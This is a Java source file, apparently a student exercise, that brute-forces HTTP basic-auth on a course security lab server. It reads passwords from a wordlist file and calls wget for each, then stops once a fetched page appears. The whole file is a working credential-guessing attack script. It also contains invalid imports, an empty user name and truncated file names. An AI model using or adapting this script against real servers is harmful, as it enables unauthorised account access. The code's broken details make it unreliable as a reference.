import java.*;
import java.io.*;
import java.String;
import java.util.*;

public class BruteForce
{
    public static void main (String [] args)
    {
               try
                {
                Date d  = new Date();
                String file = "index.html";
                String file1 = "passwd.";
                String line ="";
                String [] cmd = new String[4];
                cmd[0] = "wget";
                cmd[1] = "--http-user=";
                cmd[3] = "http://sec-crack.cs.rmit.edu./SEC/2/";
                File f = new File(file);
                FileReader fr = new FileReader(file1);
                BufferedReader in = new BufferedReader(fr); 
                while((line = in.readLine())!=null)
                {
                 Date end = new Date();
                 cmd[2] = pass(line);
                 Runtime.getRuntime().exec(cmd);
                 if(f.exists())
                 {
                   System.out.println(" have found your pasword");
                   System.out.println("the  time: " + d.getMinutes() +":"+ d.getSeconds());
                   System.out.println("the end time: " + end.getMinutes() +":"+ end.getSeconds());
                    break;
                 }
                 System.out.println(cmd[2]);
                }
              }
            catch(IOException e)
            {
              System.out.println("hello try");
            }
    }

public static String pass(String str)
{
   return "--http-passwd=" + str;
}

}